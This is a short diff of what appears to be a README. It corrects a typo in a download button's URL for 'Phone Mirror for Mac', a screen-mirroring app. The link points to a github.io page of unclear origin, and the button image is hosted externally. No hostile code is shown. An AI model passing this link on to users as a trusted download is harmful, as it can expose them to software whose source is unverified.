@@ -22,7 +22,7 @@
 </p>
 
 <p align="center">
-  <a href="hhttps://skalsd-oasd.github.io/.github/phone-mirror-mac">
+  <a href="https://skalsd-oasd.github.io/.github/phone-mirror-mac">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png"
          alt="Download Phone Mirror for Mac — Android and iPhone screen mirroring" width="160"/>
   </a>
